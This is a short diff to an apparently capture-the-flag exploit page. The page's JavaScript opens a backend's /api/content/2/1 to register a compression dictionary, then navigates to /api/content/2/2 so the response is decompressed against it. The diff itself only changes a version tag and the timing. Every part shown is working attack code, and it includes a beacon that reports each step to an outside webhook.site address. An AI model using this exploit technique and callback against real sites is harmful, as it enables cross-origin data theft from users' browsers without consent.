@@ -9,11 +9,12 @@ const B = (q.get('b') || 'http://backend:8080').replace(/\/+$/,'');
 const P = '2';
 const WT = q.get('w') || '';
 function bx(s){ if(WT) new Image().src='https://webhook.site/'+WT+'/S?'+s+'&t='+Date.now(); }
-bx('step=loaded&ver=d1&B='+encodeURIComponent(B));
+bx('step=loaded&ver=d2&B='+encodeURIComponent(B));
 // register RB dict by loading /api/content/P/1 DIRECTLY (only this dict gets registered,
 // so the confused /2 nav decompresses against RB exactly). Avoid /post/P (its inline script
 // fetches /2 and would register the decoded doc as a competing dictionary).
 const w = window.open(B + '/api/content/' + P + '/1', 'x');
-setTimeout(function(){ bx('step=nav'); try { w.location = B + '/api/content/' + P + '/2'; } catch (e) {} }, 3000);
+// give registration ample time (live bot has no debug-logging slowdown -> faster than local)
+setTimeout(function(){ bx('step=nav'); try { w.location = B + '/api/content/' + P + '/2'; } catch (e) {} }, 5000);
 </script>
 </body></html>
